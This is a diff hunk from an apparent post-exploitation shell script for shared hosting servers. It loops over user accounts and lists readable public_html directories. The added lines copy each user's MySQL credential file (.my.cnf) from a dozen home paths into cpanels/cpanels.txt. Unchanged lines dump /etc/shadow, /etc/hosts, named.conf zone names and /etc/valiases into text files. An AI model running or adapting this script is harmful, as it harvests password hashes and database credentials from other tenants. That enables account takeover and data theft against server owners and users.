@@ -224,10 +224,21 @@ ls -la /home/$i/public_html/
 [ -r "/home/sites/$i/public_html/" ] && echo "/home/sites/$i/public_html/" >> open-dir.txt
 [ -r "/var/www/html/$i/public_html/" ] && echo "/var/www/html/$i/public_html/" >> open-dir.txt
 
+
+mkdir cpanels
+cat /home/$i/.my.cnf >> cpanels/cpanels.txt
+cat /var/$i/.my.cnf >> cpanels/cpanels.txt
+cat /var/www/$i/.my.cnf >> cpanels/cpanels.txt
+cat /home1/$i/.my.cnf >> cpanels/cpanels.txt
+cat /home2/$i/.my.cnf >> cpanels/cpanels.txt
+cat /home3/$i/.my.cnf >> cpanels/cpanels.txt
+cat /home4/$i/.my.cnf >> cpanels/cpanels.txt
+cat /home5/$i/.my.cnf >> cpanels/cpanels.txt
+cat /home6/$i/.my.cnf >> cpanels/cpanels.txt
+cat /var/www/html/$i/.my.cnf >> cpanels/cpanels.txt
 done
 
 grep '^zone' /etc/named.conf | cut -d'"' -f2  > named.txt
 cat /etc/shadow > shadow.txt
 cat /etc/hosts > hosts.txt
 ls /etc/valiases/ > named2.txt
-
